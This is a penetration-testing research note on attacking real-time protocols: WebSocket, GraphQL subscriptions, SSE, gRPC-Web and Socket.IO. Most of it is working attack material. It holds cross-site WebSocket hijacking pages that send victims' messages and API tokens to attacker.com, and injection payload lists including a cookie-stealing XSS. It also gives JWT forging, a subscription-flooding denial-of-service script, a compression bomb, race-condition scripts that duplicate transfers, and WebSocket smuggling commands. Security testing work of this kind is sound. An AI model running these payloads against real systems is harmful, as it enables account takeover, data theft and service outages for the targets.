# R4.2 - WebSocket and Real-Time Protocol Vulnerability Testing
## Research Cache - Project Triage / Project Triage

**Date:** 2026-03-25
**Scope:** WebSocket, GraphQL Subscriptions, SSE, gRPC-Web, Socket.IO, Race Conditions via real-time channels

---

## 1. WebSocket Security Fundamentals

### The Protocol and Its Attack Surface

WebSockets establish a persistent, full-duplex TCP channel via an HTTP Upgrade handshake. The critical security difference from regular HTTP: once upgraded, the WebSocket connection is no longer governed by the browser's same-origin policy in the same way - the handshake goes out as a standard HTTP GET with an `Upgrade: websocket` header, and browsers will include cookies. This creates the foundation for the most impactful class of WebSocket bugs: Cross-Site WebSocket Hijacking (CSWSH).

As of 2024-2025, 5-10% of the top 100,000 websites use WebSockets. Notable CVEs including CVE-2024-26135 (MeshCentral) and CVE-2024-11045 (Stable Diffusion WebUI) confirm this remains a high-yield attack surface.

### The Handshake - What to Look For

During a WebSocket upgrade, the browser sends:

```
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://attacker.com
Cookie: session=abc123
```

Critical fields to inspect:
- `Origin` header - is it validated server-side?
- `Cookie` header - is this the only auth mechanism?
- Absence of any CSRF token in the handshake parameters
- `Sec-WebSocket-Protocol` - can be abused for version confusion

---

## 2. Cross-Site WebSocket Hijacking (CSWSH)

### Vulnerability Conditions

CSWSH is exploitable when ALL of the following are true:
1. The server uses cookies as the sole session authentication mechanism
2. The server does NOT validate the `Origin` header (or validates weakly - regex bypass)
3. Cookies are not set with `SameSite=Lax` or `SameSite=Strict`
4. No CSRF token is required in the handshake URL or parameters

### Attack Mechanics

An attacker hosts a malicious page. When the victim visits it, the page opens a WebSocket to the target using the victim's cookies. The server accepts the connection (it sees a valid cookie), and the attacker's page now has full read/write access to the WebSocket channel in the context of the victim's session.

### PoC: CSWSH Data Exfiltration

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var ws = new WebSocket('wss://vulnerable-target.com/ws');
  ws.onopen = function() {
    // Send any initial message the protocol requires
    ws.send(JSON.stringify({"action": "getProfile"}));
  };
  ws.onmessage = function(event) {
    // Exfiltrate all messages to attacker server
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(event.data));
  };
</script>
</body>
</html>
```

### PoC: CSWSH Account Takeover (Generate Auth Token)

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var ws = new WebSocket('wss://vulnerable-target.com/ws');
  ws.onopen = function() {
    // Generate a persistent login token in victim's context
    ws.send(JSON.stringify({"action": "generateApiToken", "name": "attacker-persisted"}));
  };
  ws.onmessage = function(event) {
    var data = JSON.parse(event.data);
    if (data.token) {
      fetch('https://attacker.com/steal?token=' + encodeURIComponent(data.token));
    }
  };
</script>
</body>
</html>
```

This is exactly how CVE-2024-26135 achieved complete account compromise on MeshCentral - the WebSocket endpoint allowed generating login tokens without Origin validation.

### Testing for CSWSH

**Step 1 - Capture the Upgrade handshake** in Burp Proxy. Check:
- Does the request contain only `Cookie` for auth? No `X-CSRF-Token`?
- What is the `Origin` header value?

**Step 2 - Test Origin validation** by replaying the handshake in Repeater with modified Origin headers:
```
Origin: https://evil.com          # null origin bypass
Origin: null                       # some parsers accept null
Origin: https://target.com.evil.com  # subdomain confusion
Origin: https://evil-target.com    # substring match bypass
```

**Step 3 - Automate with Python** for deeper testing:

```python
import asyncio
import websockets
import json

async def test_cswsh(target_ws_url: str, cookie: str, evil_origin: str):
    headers = {
        "Cookie": cookie,
        "Origin": evil_origin,
    }
    try:
        async with websockets.connect(target_ws_url, extra_headers=headers) as ws:
            print(f"[+] Connected with Origin: {evil_origin}")
            # Send protocol-specific messages
            await ws.send(json.dumps({"action": "ping"}))
            response = await asyncio.wait_for(ws.recv(), timeout=5.0)
            print(f"[+] Response: {response}")
            return True
    except Exception as e:
        print(f"[-] Rejected: {e}")
        return False

# Test multiple origins
async def main():
    target = "wss://target.com/ws"
    cookie = "session=your_stolen_or_test_session"
    origins_to_test = [
        "https://evil.com",
        "null",
        "https://target.com.evil.com",
        "https://eviltarget.com",
        "https://target.com%60.evil.com",
    ]
    for origin in origins_to_test:
        await test_cswsh(target, cookie, origin)

asyncio.run(main())
```

---

## 3. WebSocket Message Injection

### SQLi, XSS, and SSTI via WebSocket Messages

Once connected (either legitimately or via CSWSH), WebSocket messages are often passed directly to backend processing with insufficient sanitization. This is fertile ground for injection because:
- WebSocket APIs often bypass WAF rules designed for HTTP parameters
- Developers assume WebSocket traffic is trusted (internal, stateful)
- Automated scanners largely miss WebSocket injection

**Testing approach with Burp Suite:**
1. Open Burp Proxy, enable WebSocket history tab
2. Interact with the target to generate WebSocket messages
3. Right-click any message -> Send to Repeater
4. Modify message payloads and observe responses

**Injection payload matrix for WebSocket messages:**

```python
import asyncio
import websockets
import json

PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1 UNION SELECT null,username,password FROM users--",
        "' AND SLEEP(5)--",  # time-based blind
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:alert(1)",
        "\"><script>fetch('https://attacker.com/?c='+document.cookie)</script>",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "xxe_if_xml": [
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
    ],
}

async def fuzz_websocket(url: str, message_template: dict, inject_field: str):
    async with websockets.connect(url) as ws:
        for category, payloads in PAYLOADS.items():
            for payload in payloads:
                msg = dict(message_template)
                msg[inject_field] = payload
                await ws.send(json.dumps(msg))
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=3.0)
                    if any(indicator in resp for indicator in ["error", "SQL", "syntax", "49", "alert"]):
                        print(f"[!] Potential {category}: {payload[:50]} -> {resp[:100]}")
                except asyncio.TimeoutError:
                    pass
```

### Blind Injection via OAST

When injection responses are not reflected, use out-of-band detection:

```python
# Use Burp Collaborator or interactsh payload
oast_payloads = [
    "' AND LOAD_FILE('//your-collaborator.com/a')--",  # MySQL OOB
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",  # SSTI file read
    "\"; nslookup your-collaborator.com;\"",  # Command injection
]
```

---

## 4. WebSocket Authentication Bypass Patterns

### Pattern 1 - Auth Only on HTTP, Not on Messages

Many apps authenticate the WebSocket handshake but then trust all subsequent messages without re-validating identity. Test by:
1. Connect as User A
2. Send messages containing User B's resource IDs (IDOR)
3. Observe if server returns User B's data

### Pattern 2 - Weak Token in URL Parameter

```
wss://target.com/ws?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIifQ.
```

If the token is a JWT, test `alg: none` bypass and parameter tampering.

### Pattern 3 - Role Escalation in First Message

Some protocols expect an auth/init message after connection:

```json
{"type": "auth", "token": "user_token_here"}
```

Test sending admin role claims:
```json
{"type": "auth", "token": "user_token", "role": "admin"}
{"type": "auth", "token": "user_token", "admin": true, "user_id": 1}
```

### Pattern 4 - Race Condition After Role Change

A confirmed Shopify bug bounty finding: a user's WebSocket connection remained live briefly after their role was removed/revoked, allowing continued execution of GraphQL operations in that window. Test by:
1. Open WebSocket connection as User A
2. Revoke User A's access (change role, delete account, expire session)
3. Immediately continue sending messages on the existing connection
4. Observe if authorization is re-checked per-message or only at connect time

---

## 5. WebSocket Smuggling

### Attack Concept

WebSocket smuggling exploits a mismatch between how a frontend reverse proxy and backend server interpret the WebSocket handshake. If the proxy believes the upgrade succeeded but the backend does not (or vice versa), the proxy keeps the upstream TCP connection alive, and the attacker can reuse it to tunnel raw HTTP requests directly to the backend - bypassing all proxy-layer security controls.

### Scenario 1 - Incorrect Protocol Version

```
GET /ws HTTP/1.1
Host: target.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 99          <-- Invalid version
Sec-WebSocket-Key: base64key==
```

- Proxy doesn't validate `Sec-WebSocket-Version`, forwards to backend
- Backend returns `426 Upgrade Required`
- Proxy ignores the 426, assumes upgrade succeeded, keeps TCP open
- Attacker sends raw HTTP requests through the now-open tunnel:

```
GET /admin/internal-api HTTP/1.1
Host: target.com
Authorization: Bearer attacker-token

```

### Scenario 2 - Controlled Backend Response

If attacker controls a backend resource reachable via the proxy's health check or SSRF:
1. Send POST to health check endpoint with `Upgrade: websocket` header
2. Health check reaches attacker-controlled server
3. Attacker server responds with `HTTP/1.1 101 Switching Protocols`
4. Proxy sees 101, keeps upstream TCP socket open
5. Attacker pipes HTTP requests through it

### Affected Infrastructure

- Varnish (unpatched by vendor)
- Envoy proxy 1.8.0 and older
- Any reverse proxy performing only partial Upgrade header validation

### Testing Tool

```bash
# websocket-smuggle (0ang3el) - reference implementation
# Manual test via netcat for protocol version confusion:
nc target.com 80 << 'EOF'
GET /ws HTTP/1.1
Host: target.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 99
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

EOF
# Watch for 101 response despite invalid version
```

---

## 6. GraphQL Subscriptions over WebSocket

### How It Works

GraphQL subscriptions typically run over the `graphql-ws` or legacy `subscriptions-transport-ws` protocol. The client establishes a WebSocket, sends a `connection_init` message, then subscribes to events. This creates unique attack vectors distinct from regular GraphQL.

### Attack 1 - Query Depth/Complexity Limit Bypass (CVE-2026-30241)

Mercurius (Fastify GraphQL adapter) prior to 16.8.0 applies `queryDepth` limits only to HTTP queries, not WebSocket subscription operations. This allows unauthenticated DoS via deeply nested subscription queries:

```javascript
// Subscription payload that bypasses depth limits
const deepSubscription = {
  type: "subscribe",
  id: "1",
  payload: {
    query: `subscription {
      user {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends { id name email posts { comments { author { friends { id }}}}}
                }
              }
            }
          }
        }
      }
    }`
  }
};
```

**Test:** Connect via WebSocket, send deeply nested subscription, monitor server CPU/memory. Any server that accepts it without error is vulnerable.

### Attack 2 - Authorization Bypass on Subscription Events

A documented Directus vulnerability: permission filters were not properly checked for subscription event notifications. A user subscribed to an object type would receive notifications for records they should not have access to if another user modified them.

**Testing pattern:**
1. Connect as low-privilege User A
2. Subscribe to a resource type: `subscription { userUpdated { id email role password } }`
3. From a second session (admin), modify a record
4. Observe if User A's subscription receives data they should not see

### Attack 3 - connection_init Authentication Bypass

The `subscriptions-transport-ws` protocol sends credentials in `connection_init`:

```json
{"type": "connection_init", "payload": {"authToken": "Bearer eyJ..."}}
```

Test with:
- No payload at all
- Empty payload `{}`
- Null token: `{"authToken": null}`
- Expired/malformed JWT
- Token from another user/tenant

### Attack 4 - Subscription Flooding (Resource Exhaustion)

```python
import asyncio
import websockets
import json

async def flood_subscriptions(target_url: str, num_connections: int = 200):
    """Open many concurrent subscriptions to exhaust server resources."""
    async def open_sub(i: int):
        async with websockets.connect(target_url, subprotocols=["graphql-ws"]) as ws:
            await ws.send(json.dumps({"type": "connection_init", "payload": {}}))
            await ws.send(json.dumps({
                "type": "subscribe",
                "id": str(i),
                "payload": {"query": "subscription { messageCreated { id content } }"}
            }))
            await asyncio.sleep(300)  # Hold connection open

    tasks = [open_sub(i) for i in range(num_connections)]
    await asyncio.gather(*tasks, return_exceptions=True)
```

### Tools

- **graphql-ws** npm package for crafting raw protocol messages
- **Altair GraphQL Client** - supports WebSocket subscriptions with manual control
- Burp Suite with SocketSleuth extension for interception

---

## 7. Server-Sent Events (SSE) Attack Surface

### Architecture

SSE is a unidirectional server-to-client stream over a persistent HTTP GET connection. Authentication is typically via cookies (sent automatically) or a token in the URL. The attack surface is smaller than WebSocket but distinct.

### Attack 1 - CSRF via SSE (Data Exfiltration)

SSE connections start with a browser-initiated GET request. Cookies are included automatically. If the server establishes an SSE stream based only on cookies with no CSRF token:

```html
<!-- Attacker's page: forces victim's browser to establish SSE connection -->
<script>
  var source = new EventSource('https://vulnerable-target.com/api/stream/notifications');
  source.onmessage = function(event) {
    // Exfiltrate all streamed data
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({data: event.data})
    });
  };
</script>
```

**Note:** Unlike CSWSH, the attacker cannot READ the SSE response cross-origin due to CORS - UNLESS the server has a permissive CORS policy (`Access-Control-Allow-Origin: *` or reflecting the requesting origin).

**Test:** Check if the SSE endpoint has a permissive CORS header AND relies solely on cookies for auth.

### Attack 2 - Token Expiry Session Hijack

SSE connections can stay open for hours or days. If the server doesn't re-validate the session token on the open connection:
1. Obtain a session token by any means (XSS, CSRF, etc.)
2. Establish an SSE connection
3. Even after the token is invalidated/logged-out on the HTTP side, the SSE stream may continue delivering data

### Attack 3 - MCP/AI Tool SSE Attacks (2025 Landscape)

CVE-2025-49596 in Anthropic's MCP Inspector demonstrates the SSE attack surface in AI tooling:
- SSE endpoint with no origin validation at `http://0.0.0.0:6277/sse`
- Attacker's web page crafts cross-origin request to the SSE endpoint
- CSRF + SSE combined to execute arbitrary commands: `GET /sse?transportType=stdio&command=touch&args=/tmp/pwned`

This pattern (SSE + CSRF = RCE) applies to any locally-running tool that serves an SSE endpoint without origin checks. Hunt for developer tools, CI/CD agents, and AI assistants running locally.

### Attack 4 - XSS via SSE Data Rendering

If the client-side JavaScript renders SSE event data directly into the DOM:

```javascript
// Vulnerable client code:
source.onmessage = function(e) {
  document.getElementById('feed').innerHTML += e.data;  // XSS if data is not escaped
};
```

Any server-side control over the stream content (e.g., stored XSS payload already in DB) will trigger execution when streamed via SSE.

### Testing Checklist for SSE

- [ ] CORS header on the SSE endpoint: permissive or restrictive?
- [ ] Auth mechanism: cookie-only, or token in URL?
- [ ] Does the server re-validate session mid-stream?
- [ ] Is streamed data rendered as HTML anywhere on the client?
- [ ] What happens on reconnect with an expired token?

---

## 8. gRPC-Web Attack Surface

### Recon - Service Discovery

gRPC server reflection (if enabled) exposes all available service/method definitions:

```bash
# Enumerate services
grpcurl -plaintext target.com:443 list

# Enumerate methods on a service
grpcurl -plaintext target.com:443 list com.example.UserService

# Describe method signatures
grpcurl -plaintext target.com:443 describe com.example.UserService.GetUser
```

If reflection is disabled, look for `.proto` files in:
- JavaScript bundles (often embedded as string literals)
- GitHub repositories for the target
- npm/PyPI packages the app depends on

### Attack 1 - Injection via Protobuf Fields

Despite strong typing, gRPC is still vulnerable to injection if fields are used directly in queries. Common injection points:

```python
import grpc
from google.protobuf import json_format

# SQL injection in a string field
stub.SearchUsers(UserSearchRequest(query="admin' OR '1'='1"))
stub.SearchUsers(UserSearchRequest(query="admin'; WAITFOR DELAY '0:0:5'--"))

# Command injection in metadata
metadata = [
    ('x-user-role', "admin' OR '1'='1"),
    ('x-trace-id', '$(whoami)'),
    ('x-debug-cmd', '`id`'),
]
stub.GetData(request, metadata=metadata)
```

### Attack 2 - Missing Authentication Checks

Many gRPC services assume they're internal-only and skip auth checks. Test every method without credentials:

```python
channel = grpc.insecure_channel('target.com:443')
stub = UserServiceStub(channel)

# No credentials - does this work?
try:
    response = stub.GetAllUsers(Empty())
    print(f"[!] Unauthenticated access: {response}")
except grpc.RpcError as e:
    print(f"Auth required: {e.code()}")
```

### Attack 3 - JWT Manipulation in gRPC Metadata

```python
import jwt
import grpc

# Decode existing token
token = "eyJhbGciOiJIUzI1NiJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})

# Attempt alg:none bypass
forged = jwt.encode({**decoded, "role": "admin"}, "", algorithm="none")

metadata = [('authorization', f'Bearer {forged}')]
stub.AdminAction(request, metadata=metadata)
```

### Attack 4 - gRPC-Web Specific (Browser-Accessible)

gRPC-Web is a translation layer allowing browsers to call gRPC services over HTTP/1.1. It uses `Content-Type: application/grpc-web+proto` and a specific framing format.

**Intercept in Burp:** gRPC-Web traffic appears as binary POST requests. Use the "gRPC-Web" content type decoder in Burp to decode protobuf bodies.

**Compression Bomb:**
```python
import zlib
# Craft a tiny compressed payload that decompresses to gigabytes
# Some gRPC implementations validate compressed size, not uncompressed
bomb = zlib.compress(b'\x00' * (100 * 1024 * 1024))  # 100MB of zeros
```

### Attack 5 - Plaintext gRPC (Forgot to Enable TLS)

```bash
# Test if plaintext gRPC is exposed (common in dev/staging leaked to prod)
grpcurl -plaintext target.com:80 list
grpcurl -plaintext target.com:50051 list
```

### Tools

- **grpcurl** - CLI for calling gRPC services
- **grpcui** - Web UI for gRPC (like Postman but for gRPC)
- **Burp Suite** with gRPC-Web extension
- **Evans** - interactive gRPC client with REPL

---

## 9. Socket.IO Specific Attacks

### Namespace Enumeration and Exploitation

Socket.IO namespaces are like virtual channels (e.g., `/admin`, `/internal`, `/debug`). Many developers lock down the default namespace but forget to protect hidden ones.

```javascript
// Client-side enumeration of namespaces
const namespaces = ['/admin', '/internal', '/debug', '/staff', '/api', '/events'];
namespaces.forEach(ns => {
  const socket = io('https://target.com' + ns, {
    auth: { token: 'user_token' }
  });
  socket.on('connect', () => console.log('[+] Connected to namespace:', ns));
  socket.on('connect_error', (err) => console.log('[-] Rejected:', ns, err.message));
});
```

### Event Enumeration

```javascript
// Hook into all incoming events to discover undocumented ones
const socket = io('https://target.com');
const originalOnEvent = socket.onevent.bind(socket);
socket.onevent = function(packet) {
  console.log('[EVENT]', packet.data);
  originalOnEvent(packet);
};

// Emit undocumented events and observe server responses
['admin_action', 'debug', 'system', 'internal', 'broadcast_all'].forEach(event => {
  socket.emit(event, {payload: 'test'}, (response) => {
    console.log('[RESPONSE]', event, response);
  });
});
```

### CVE-2022-2421 - Prototype Pollution via Attachment Parsing (CVSS 10.0)

Improper type validation in socket.io-parser allowed overwriting the `_placeholder` object, enabling attackers to place function references at arbitrary locations in the parsed query object - effectively prototype pollution with arbitrary code execution capability.

### CVE-2024-38355 - Unhandled Exception DoS

Socket.IO had an unhandled exception that could crash the server when receiving malformed packets. Fuzz the parser with malformed binary attachment data:

```python
import socketio
import struct

sio = socketio.Client()
sio.connect('https://target.com')

# Craft malformed binary attachment packets
malformed_packets = [
    b'\x05' + struct.pack('>I', 0xFFFFFFFF) + b'\x00' * 10,  # Oversized attachment count
    b'\x05\x01\x00',  # Binary event with missing attachment
    b'\x06\x01',      # Binary ack with no data
]
for pkt in malformed_packets:
    sio._trigger_event('message', '/', pkt)
```

### CORS Misconfiguration (Pre-2.4.0 Default)

Socket.IO before 2.4.0 whitelisted ALL origins by default. Even on patched versions, check:

```javascript
// On the server side - what is the CORS config?
// Bug: many apps set:
io.cors({ origin: "*", credentials: true })
// This combination is invalid per spec but some servers accept it anyway
```

### Predictable Session IDs (Pre-1.x)

Socket.IO 0.9.x used `Math.random()` for session IDs. While modern versions use crypto-random values, legacy deployments may still exist. Test by collecting multiple session IDs and checking entropy.

---

## 10. Race Conditions via WebSocket

### Why WebSockets Excel at Race Conditions

Traditional HTTP race conditions require precise timing of multiple simultaneous requests to hit the processing window. WebSocket connections eliminate connection setup latency - once connected, messages can be sent in rapid bursts with near-zero overhead, making the race window far more reliable to hit.

### Pattern 1 - Single-Use Code Redemption

```python
import asyncio
import websockets
import json

async def race_single_use(url: str, session_cookie: str, promo_code: str):
    """Send the same promo code redemption simultaneously on multiple connections."""
    async def apply_code(conn_id: int):
        headers = {"Cookie": session_cookie}
        async with websockets.connect(url, extra_headers=headers) as ws:
            await ws.send(json.dumps({"action": "redeemCode", "code": promo_code}))
            resp = await asyncio.wait_for(ws.recv(), timeout=5.0)
            print(f"[Conn {conn_id}] {resp}")

    # Fire all simultaneously
    tasks = [apply_code(i) for i in range(20)]
    await asyncio.gather(*tasks)

asyncio.run(race_single_use("wss://target.com/ws", "session=abc", "PROMO2024"))
```

### Pattern 2 - Concurrent Messages on Single Connection

Some servers process messages asynchronously even on a single connection. Sending a burst of messages without awaiting responses can trigger races:

```python
async def burst_race(url: str, session_cookie: str):
    headers = {"Cookie": session_cookie}
    async with websockets.connect(url, extra_headers=headers) as ws:
        # Send all messages before reading any response
        messages = [
            json.dumps({"action": "transfer", "amount": 100, "to": "attacker"}),
            json.dumps({"action": "transfer", "amount": 100, "to": "attacker"}),
            json.dumps({"action": "transfer", "amount": 100, "to": "attacker"}),
            # ... repeat
        ]
        # Use Turbo Intruder-style burst: send all, then read
        for msg in messages:
            await ws.send(msg)
        # Collect all responses
        for _ in messages:
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=2.0)
                print(resp)
            except asyncio.TimeoutError:
                break
```

### Pattern 3 - Burp Suite Turbo Intruder for WebSocket Races

Burp's Turbo Intruder supports WebSocket threading:

```python
# Turbo Intruder script for WebSocket race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          engine=Engine.THREADED)
    for i in range(20):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.status or 'success' in req.response:
        table.add(req)
```

### Pattern 4 - State Confusion Race

Connect as two different users/sessions and execute conflicting operations simultaneously. Examples:
- Both users simultaneously bid the same "last slot" in an auction
- Both users simultaneously accept a friend request that should only be accepted once
- Concurrent login + session token rotation

---

## 11. Tooling Summary

| Tool | Purpose | Notes |
|------|---------|-------|
| Burp Suite + SocketSleuth | WS history, match/replace, intruder for WebSocket | Best for intercepting and fuzzing |
| Burp Suite + WS-Strike | Comprehensive WS pentest - injection, IDOR, hijacking | 2026 release, purpose-built |
| websockets (Python lib) | Custom WS clients for automation | `pip install websockets` |
| python-socketio | Socket.IO client in Python | `pip install python-socketio` |
| grpcurl | gRPC enumeration and calling | `brew install grpcurl` |
| grpcui | Web UI for gRPC services | Interactive exploration |
| graphql-ws | GraphQL subscription protocol client | `npm install graphql-ws` |
| wscat | CLI WebSocket client for quick tests | `npm install -g wscat` |
| cswsh (DeepakPawar95) | CLI tool for CSWSH testing | Python, pip-installable |
| websocket-smuggle (0ang3el) | PoC for WS smuggling via proxies | Reference implementation |

---

## 12. Recon - Finding WebSocket Endpoints

```python
import re
from pathlib import Path

def extract_websocket_endpoints(js_content: str) -> list[str]:
    """Extract WebSocket URLs from JavaScript source."""
    patterns = [
        r'new WebSocket\(["\']([^"\']+)["\']',
        r'io\(["\']([^"\']+)["\']',
        r'wss?://[^\s"\'<>]+',
        r'["\']/(ws|socket|websocket|chat|realtime|stream|events)[^"\']*["\']',
    ]
    found = []
    for pattern in patterns:
        found.extend(re.findall(pattern, js_content, re.IGNORECASE))
    return list(set(found))

def find_sse_endpoints(js_content: str) -> list[str]:
    """Extract SSE EventSource URLs from JavaScript."""
    patterns = [
        r'new EventSource\(["\']([^"\']+)["\']',
        r'EventSource\(["\']([^"\']+)["\']',
    ]
    found = []
    for pattern in patterns:
        found.extend(re.findall(pattern, js_content, re.IGNORECASE))
    return list(set(found))
```

Common WebSocket endpoint paths to probe:
```
/ws, /wss, /websocket, /socket, /socket.io, /chat, /stream,
/api/ws, /api/socket, /api/stream, /api/events, /realtime,
/graphql/subscriptions, /subscriptions, /live, /push, /notify
```

---

## 13. Reporting and Impact Tiers

| Vulnerability | Typical Severity | Key Evidence Needed |
|--------------|-----------------|---------------------|
| CSWSH with account takeover | Critical | PoC HTML page + victim session token/action captured |
| CSWSH with data read only | High | PoC showing PII/sensitive data exfiltration |
| WS injection (SQLi, XSS) | High-Critical | Payload execution proof |
| WS authentication bypass | High | Access to unauthorized resources |
| WS smuggling to internal APIs | High-Critical | Internal endpoint access proof |
| GraphQL subscription BOLA | High | Data from unauthorized records received |
| Socket.IO namespace bypass | Medium-High | Access to undocumented namespace + data |
| SSE CSRF + CORS data leak | High | Sensitive data in exfiltrated stream |
| Race condition via WS | Medium-High | Duplicate resource redemption/balance manipulation |
| gRPC unauthenticated access | High-Critical | Sensitive data/admin function accessible |
| DoS via subscription flood | Medium | Server resource proof, responsible disclosure |

---

## Sources

- [Cross-site WebSocket hijacking - PortSwigger Web Security Academy](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [WebSocket Attacks - HackTricks](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)
- [MeshCentral CVE-2024-26135 - Praetorian](https://www.praetorian.com/blog/meshcentral-cross-site-websocket-hijacking-vulnerability/)
- [CSWSH Understanding and Exploiting - Pentest-Tools.com](https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh)
- [WebSocket Security - OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [SocketSleuth Burp Extension - Snyk Labs](https://labs.snyk.io/resources/socketsleuth-improving-security-testing-for-websocket-applications/)
- [WS-Strike Burp Extension - GitHub](https://github.com/ShubhamDubeyy/WS-Strike)
- [Smuggling HTTP requests over fake WebSocket - 0ang3el](https://github.com/0ang3el/websocket-smuggle)
- [h2c Smuggling - Bishop Fox](https://bishopfox.com/blog/h2c-smuggling-request)
- [GraphQL Subscription CVE-2026-30241 - CVEReports](https://cvereports.com/reports/CVE-2026-30241)
- [GraphQL Security Pentester's Perspective - Afine](https://afine.com/graphql-security-from-a-pentesters-perspective/)
- [gRPC Security Vulnerabilities - IBM PTC Security](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9)
- [gRPC Penetration Testing - Tanner Security](https://tannersecurity.com/grpc-penetration-testing/)
- [gRPC-Web Pentest - HackTricks](https://book.hacktricks.xyz/pentesting-web/grpc-web-pentest)
- [CVE-2025-49596 MCP Inspector RCE via SSE - Oligo Security](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596)
- [SSE Security Testing - HAHWUL](https://www.hahwul.com/sec/web-security/sse/)
- [Socket.IO CVE-2024-38355 - Vicarius](https://www.vicarius.io/vsociety/posts/unhandled-exception-in-socketio-cve-2024-38355-exploit)
- [Socket.IO CVE-2022-2421 - GitHub Issue](https://github.com/socketio/socket.io/issues/4509)
- [How to Hack WebSockets and Socket.io - Black Hills InfoSec](https://www.blackhillsinfosec.com/how-to-hack-websockets-and-socket-io/)
- [Race Conditions via WebSocket - DeepStrike](https://deepstrike.io/blog/mastering-websockets-vulnerabilities)
- [WebSocket Security - Ably](https://ably.com/topic/websocket-security)
- [Testing WebSocket Vulnerabilities - PortSwigger](https://portswigger.net/web-security/websockets)
